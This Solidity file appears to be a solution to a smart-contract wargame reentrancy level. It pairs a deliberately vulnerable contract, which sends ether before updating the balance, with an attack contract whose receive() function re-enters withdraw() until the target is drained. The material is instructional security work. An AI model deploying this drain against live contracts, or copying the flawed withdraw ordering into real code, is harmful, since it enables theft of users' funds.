// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//import "@openzeppelin/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAttack {

    address owner;
    Reentrance toAttack;

    constructor(address payable _levelInstance) public payable {
        owner = msg.sender;
        toAttack = Reentrance(_levelInstance);
    }

    function attack() public {
        require(msg.sender == owner);

        toAttack.donate{value: 0.001 ether}(address(this));

        toAttack.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(toAttack).balance > 0) {
            toAttack.withdraw(0.001 ether);
        }
    }

}

